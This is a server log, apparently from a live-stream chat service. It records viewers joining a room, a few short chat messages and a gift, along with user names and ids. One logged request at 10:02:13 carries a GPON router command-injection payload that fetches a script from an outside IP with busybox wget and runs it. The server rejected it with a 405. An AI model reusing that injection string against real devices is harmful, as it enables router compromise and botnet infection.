[2021-04-19 09:48:18.286] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b893441df7304f5f8f49c7aa5710b10c',
  username: '傅大野',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdq6TB' }
[2021-04-19 09:48:18.287] [INFO] - [ 'IDaz0H_cyVa4iMKeADAa', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:48:48.138] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b893441df7304f5f8f49c7aa5710b10c',
  username: '傅大野',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdqDlI' }
[2021-04-19 09:48:48.138] [INFO] - [ 'u3F8s2Ld2Q7wXZRsADAb', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:48:57.936] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '8ee7acc0de544cf3b026faa91bc7fef3',
  username: '闭眼茉莉安',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdqFI_' }
[2021-04-19 09:48:57.937] [INFO] - [ 'TZlD92vm3ZhdbLvDADAc', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:48:59.287] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '9e612fec79b942bab6b5da88da7d79bd',
  username: '施建雄',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdqGVK' }
[2021-04-19 09:48:59.287] [INFO] - [ 'cbtpfomNdGjzPGoMADAd', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:48:59.879] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'e4e0bfcc39d649cdb5047c04a096f0fd',
  username: '陶丽',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdqH4Q' }
[2021-04-19 09:48:59.880] [INFO] - [ 'UZKHT5kqDDz2NBqWADAe', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:49:02.621] [INFO] - msg { role: 0,
  username: '阿伟',
  _id: 'BfXKLkhe8LZ2oK9-ADAW',
  msg: '没开始吗？' }
[2021-04-19 09:49:04.001] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdqHaX' }
[2021-04-19 09:49:04.001] [INFO] - [ 'H0Qf6RH6To7IHV8NADAf', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:49:12.879] [INFO] - msg { role: 0,
  username: '闭眼茉莉安',
  _id: 'TZlD92vm3ZhdbLvDADAc',
  msg: '开始了呀' }
[2021-04-19 09:49:34.991] [INFO] - gift { role: 0,
  _id: 'TZlD92vm3ZhdbLvDADAc',
  msg: '666',
  num: 1,
  img: 'https://culturecloud-live.oss-cn-shanghai.aliyuncs.com/gift/666.gif' }
[2021-04-19 09:49:49.042] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b893441df7304f5f8f49c7aa5710b10c',
  username: '傅大野',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdqScz' }
[2021-04-19 09:49:49.042] [INFO] - [ '5TdQ1pGp5Ev2PV0FADAg', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:49:50.653] [INFO] - msg { role: 0,
  username: '阿伟',
  _id: 'BfXKLkhe8LZ2oK9-ADAW',
  msg: '有了' }
[2021-04-19 09:50:12.606] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '0df13a071e6b4190ac4e05cacf28ebbe',
  username: '棠杰',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdqYOR' }
[2021-04-19 09:50:12.606] [INFO] - [ 'RieGMgRFqx40zSNIADAh', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:50:46.383] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b893441df7304f5f8f49c7aa5710b10c',
  username: '傅大野',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdqgdM' }
[2021-04-19 09:50:46.383] [INFO] - [ 'DX-MrzDEEOFdwhb6ADAi', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:50:52.920] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '6762081cf28f48c0b34a23b506784128',
  username: '吴玉林',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdqi4O' }
[2021-04-19 09:50:52.920] [INFO] - [ 'H1RBai9xxdhQxjfwADAj', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:51:09.860] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '616d4661741a4e0c9a70347057f39cde',
  username: '施瑞康',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdqmXj' }
[2021-04-19 09:51:09.860] [INFO] - [ 'Wvrd8gAwKR-9t6sqADAk', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:51:16.805] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '616d4661741a4e0c9a70347057f39cde',
  username: '施瑞康',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdqoD-' }
[2021-04-19 09:51:16.805] [INFO] - [ 'c5ibnV1eGPBucmK3ADAl', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:51:47.447] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b893441df7304f5f8f49c7aa5710b10c',
  username: '傅大野',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdqvXC' }
[2021-04-19 09:51:47.447] [INFO] - [ 'ux8Qjk7atvYoX5wdADAm', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:52:33.600] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdr4lE' }
[2021-04-19 09:52:33.600] [INFO] - [ '14IUIkAVvgHTvGoWADAn', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:52:44.436] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b893441df7304f5f8f49c7aa5710b10c',
  username: '傅大野',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdr7Rq' }
[2021-04-19 09:52:44.437] [INFO] - [ 'U-zxFOKP1__A4r8QADAo', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:53:15.954] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b893441df7304f5f8f49c7aa5710b10c',
  username: '傅大野',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdrF7r' }
[2021-04-19 09:53:15.954] [INFO] - [ '-cQ4t0fGt_W_AbzUADAp', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:53:37.969] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b893441df7304f5f8f49c7aa5710b10c',
  username: '傅大野',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdrKVS' }
[2021-04-19 09:53:37.970] [INFO] - [ 'oeDHlT0X6IBCSPevADAq', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:53:42.952] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'a11e4827bd314195b67db13a41072159',
  username: '红樱桃',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdrLkr' }
[2021-04-19 09:53:42.953] [INFO] - [ 'Sxr-4IbdoeiDJJ6KADAr', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:53:50.667] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '6fbd7dde68784af19efe577878ed1e7b',
  username: 'Wang',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdrNcL' }
[2021-04-19 09:53:50.667] [INFO] - [ 'LXcZBPs5OZPVL2nOADAs', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:53:54.528] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b893441df7304f5f8f49c7aa5710b10c',
  username: '傅大野',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdrOYY' }
[2021-04-19 09:53:54.528] [INFO] - [ 'QIhPi-u7eBDguzFVADAt', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:54:14.362] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'a3bbd9a4c7904fedbefac9da52f9638c',
  username: '卞莉莉',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdrTON' }
[2021-04-19 09:54:14.362] [INFO] - [ '6NZEYVVmI7wxJkovADAu', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:54:40.452] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '8ee7acc0de544cf3b026faa91bc7fef3',
  username: '闭眼茉莉安',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdrYwz' }
[2021-04-19 09:54:40.452] [INFO] - [ '3ht4iti8cRBSzdudADAv', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:55:18.945] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '8c6adc7f85a7462d9c09b8097a8ee1a7',
  username: '青青雨兰',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdrj7m' }
[2021-04-19 09:55:18.945] [INFO] - [ 'UlwkujGfgDMUjVIkADAw', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:55:26.663] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b893441df7304f5f8f49c7aa5710b10c',
  username: '傅大野',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdrl2N' }
[2021-04-19 09:55:26.663] [INFO] - [ 'b9rUf-qgAFx6m_CmADAx', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:55:48.122] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-04-19 09:56:29.407] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'e4e0bfcc39d649cdb5047c04a096f0fd',
  username: '陶丽',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdr-qY' }
[2021-04-19 09:56:29.407] [INFO] - [ 'HgJXtY4BIN9EFYMxADAy', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:56:33.221] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b893441df7304f5f8f49c7aa5710b10c',
  username: '傅大野',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdr_HI' }
[2021-04-19 09:56:33.221] [INFO] - [ '7Zzn2AE8J1u8cfyIADAz', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:56:43.694] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'f7772626fbf64741b575b7abeccb8283',
  username: '阿炳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZds1-H' }
[2021-04-19 09:56:43.695] [INFO] - [ 'W5mXuV7rD0ZVugSAADA0', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:56:46.393] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZds2Uy' }
[2021-04-19 09:56:46.393] [INFO] - [ 'oL1sonpd67kUzMSxADA1', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:57:02.580] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '6762081cf28f48c0b34a23b506784128',
  username: '吴玉林',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZds6KX' }
[2021-04-19 09:57:02.581] [INFO] - [ 'hjpnjVHrI5IIXQnOADA2', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:57:03.751] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b893441df7304f5f8f49c7aa5710b10c',
  username: '傅大野',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZds6ld' }
[2021-04-19 09:57:03.751] [INFO] - [ 'knMJ9Ezb499vVZv7ADA3', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:57:34.146] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b893441df7304f5f8f49c7aa5710b10c',
  username: '傅大野',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdsEAi' }
[2021-04-19 09:57:34.146] [INFO] - [ 'L0YG8K3AYe788lakADA4', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:57:39.212] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '8c6adc7f85a7462d9c09b8097a8ee1a7',
  username: '青青雨兰',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdsFM_' }
[2021-04-19 09:57:39.212] [INFO] - [ 'JSTJXHBkb5y7s-S7ADA5', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:58:18.524] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '8c6adc7f85a7462d9c09b8097a8ee1a7',
  username: '青青雨兰',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdsOzH' }
[2021-04-19 09:58:18.524] [INFO] - [ 'veSizDwS9Yt7dMYpADA6', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:58:53.586] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b893441df7304f5f8f49c7aa5710b10c',
  username: '傅大野',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdsXa4' }
[2021-04-19 09:58:53.586] [INFO] - [ 'obzuJLgZkJtfc6UzADA7', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:00:00.976] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'e20f56b2e70d4f3ab4a21dff92bbede4',
  username: 'Toni',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdsnoG' }
[2021-04-19 10:00:00.976] [INFO] - [ 'clpKYzJxfReRe0sIADA8', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:00:09.249] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdsp-Z' }
[2021-04-19 10:00:09.250] [INFO] - [ 'AfIJS5XLYb2DN-gdADA9', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:00:16.786] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '90ba5de812be4ae8b570281bd44cdf43',
  username: '严蓉',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdsrvs' }
[2021-04-19 10:00:16.786] [INFO] - [ 'Hid3BIqOCxLaxRxTADA-', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:01:09.645] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'e5488922aaef4393a3a8781a14bb96bf',
  username: '筝弘ZHU',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdt2oX' }
[2021-04-19 10:01:09.645] [INFO] - [ 'CoCs07TFZUIo2hYdADA_', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:01:11.110] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'a11e4827bd314195b67db13a41072159',
  username: '红樱桃',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdt39Z' }
[2021-04-19 10:01:11.110] [INFO] - [ '1AtIs_XyukmSe-aYADBA', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:01:21.067] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdt5aK' }
[2021-04-19 10:01:21.067] [INFO] - [ 'Qhn51_lxR2Ly9PKWADBB', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:01:39.986] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'e5488922aaef4393a3a8781a14bb96bf',
  username: '筝弘ZHU',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdtACY' }
[2021-04-19 10:01:39.986] [INFO] - [ 'w4Ncam5cllZimQMEADBC', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:02:13.914] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/GponForm/diag_Form?style/ "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(busybox+wget+http://46.249.33.79/cache+-O+->+/dev/.p;sh+/dev/.p)&ipv=0\r\n" 405 0ms
[2021-04-19 10:02:28.376] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'a3bbd9a4c7904fedbefac9da52f9638c',
  username: '卞莉莉',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdtLq7' }
[2021-04-19 10:02:28.377] [INFO] - [ 'ST_uxCIpxF1CAPRrADBD', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:02:35.168] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'a11e4827bd314195b67db13a41072159',
  username: '红樱桃',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdtNh6' }
[2021-04-19 10:02:35.169] [INFO] - [ 'rcUhDG54Vn9NnUqmADBE', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:02:37.985] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'a3bbd9a4c7904fedbefac9da52f9638c',
  username: '卞莉莉',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdtOZW' }
[2021-04-19 10:02:37.985] [INFO] - [ '2l-mcpMZOF7xyP8NADBF', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:02:46.677] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdtQS-' }
[2021-04-19 10:02:46.677] [INFO] - [ 'mrkUHgcWJ4t1bAatADBG', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:03:06.060] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'bdfe133fcfaf444d9950d04bb3f64199',
  username: '爱咋咋地',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdtVZI' }
[2021-04-19 10:03:06.060] [INFO] - [ 'FI7ue8EhYH-d2YgcADBH', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:03:20.652] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'e4e0bfcc39d649cdb5047c04a096f0fd',
  username: '陶丽',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdtZ5f' }
[2021-04-19 10:03:20.653] [INFO] - [ 'P3GuR2yhRb6UNJwjADBI', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:03:37.243] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'a3bbd9a4c7904fedbefac9da52f9638c',
  username: '卞莉莉',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdtcsE' }
[2021-04-19 10:03:37.243] [INFO] - [ '4yDYBos-QVyQd0AWADBJ', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:03:53.409] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '6fbd7dde68784af19efe577878ed1e7b',
  username: 'Wang',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdtgm7' }
[2021-04-19 10:03:53.410] [INFO] - [ 'n4EJ9ZuDwSwZgkFDADBK', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:04:17.708] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '6f729ba4283242fba0cb8bdadb2c366d',
  username: '敏姐',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdtmkW' }
[2021-04-19 10:04:17.708] [INFO] - [ 'e15Vb518BXuwNhE6ADBL', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:04:24.597] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'e5488922aaef4393a3a8781a14bb96bf',
  username: '筝弘ZHU',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdtoOa' }
[2021-04-19 10:04:24.597] [INFO] - [ 'lTNGRv5dbvCN934aADBM', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:04:35.257] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '8c6adc7f85a7462d9c09b8097a8ee1a7',
  username: '青青雨兰',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdtqrt' }
[2021-04-19 10:04:35.258] [INFO] - [ 'e3iClozu-MUW9o02ADBN', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:05:02.137] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'e5488922aaef4393a3a8781a14bb96bf',
  username: '筝弘ZHU',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdtxYb' }
[2021-04-19 10:05:02.137] [INFO] - [ 'HgKzfg4_Omi2-QAGADBO', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:06:10.061] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'e5488922aaef4393a3a8781a14bb96bf',
  username: '筝弘ZHU',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZduC8P' }
[2021-04-19 10:06:10.061] [INFO] - [ 'wNh_hPf-KtUry5dVADBP', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:06:19.471] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '1d216cc2de0f4804a46ef11c18c7a6d0',
  username: '金羊',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZduFW5' }
[2021-04-19 10:06:19.472] [INFO] - [ 'HtJ9WpKIkwbmQLvaADBQ', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:06:23.117] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'a3bbd9a4c7904fedbefac9da52f9638c',
  username: '卞莉莉',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZduFL0' }
[2021-04-19 10:06:23.117] [INFO] - [ 'TQTVoaK_nj_fzXjTADBR', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:06:57.880] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '8c6adc7f85a7462d9c09b8097a8ee1a7',
  username: '青青雨兰',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZduNvI' }
[2021-04-19 10:06:57.881] [INFO] - [ 'm18ac0R67pL_epiiADBS', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:07:01.401] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZduOfp' }
[2021-04-19 10:07:01.402] [INFO] - [ '11J3MyR-Tl_ndSIXADBT', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:07:11.284] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '0a08a50acd4c4028bde3ad8c51bae37b',
  username: '徐胜环老师',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZduRBZ' }
[2021-04-19 10:07:11.284] [INFO] - [ 'prQ0ntwlyICEpFjeADBU', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:07:15.118] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '5ca57665cdaa4fe9bdec74d792576331',
  username: '袁老师',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZduReG' }
[2021-04-19 10:07:15.118] [INFO] - [ 'V0WcS1jxq1-9VzkXADBV', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:08:15.532] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '8ee7acc0de544cf3b026faa91bc7fef3',
  username: '闭眼茉莉安',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdugoN' }
[2021-04-19 10:08:15.532] [INFO] - [ 'bjzFGXeynI_X5gA8ADBW', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:08:43.086] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '172109c81e114de194420ddda315d52e',
  username: '陆黎敏',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdunVw' }
[2021-04-19 10:08:43.087] [INFO] - [ '00nlD3Z1vAch-DqDADBX', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:08:48.673] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'a716d27e277e470ab379932be4d4a994',
  username: 'MASA',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZduor2' }
[2021-04-19 10:08:48.673] [INFO] - [ 'Lbo9vzHxLLJshM02ADBY', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:09:49.022] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdv1a7' }
[2021-04-19 10:09:49.022] [INFO] - [ '1JA9FtI2IZ3DQN3nADBZ', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:09:50.476] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'bab51ad40f1240a9b207360525bf7b7e',
  username: '虞美人919',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdv1xz' }
[2021-04-19 10:09:50.477] [INFO] - [ 'Qz-p0ZI8DjYgpbiSADBa', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:09:52.943] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'a716d27e277e470ab379932be4d4a994',
  username: 'MASA',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdv2XJ' }
[2021-04-19 10:09:52.945] [INFO] - [ 'K1R5yj9N9EJsTV-DADBb', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:11:05.009] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '62413c658ee547b5be67a601452e81cc',
  username: '王乾隆',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdvKgD' }
[2021-04-19 10:11:05.009] [INFO] - [ 'TXvZe-gUx1ke4hD3ADBc', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:11:06.478] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '1d216cc2de0f4804a46ef11c18c7a6d0',
  username: '金羊',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdvLap' }
[2021-04-19 10:11:06.478] [INFO] - [ '-gvFnxa7EErMk6kiADBd', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:11:16.519] [INFO] - msg { role: 0,
  username: 'MASA',
  _id: 'K1R5yj9N9EJsTV-DADBb',
  msg: '👏 👏 👏 ' }
[2021-04-19 10:11:23.452] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '1d216cc2de0f4804a46ef11c18c7a6d0',
  username: '金羊',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdvPjc' }
[2021-04-19 10:11:23.452] [INFO] - [ 'UsyxR4V63uh1uhnDADBe', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:11:25.126] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdvO-h' }
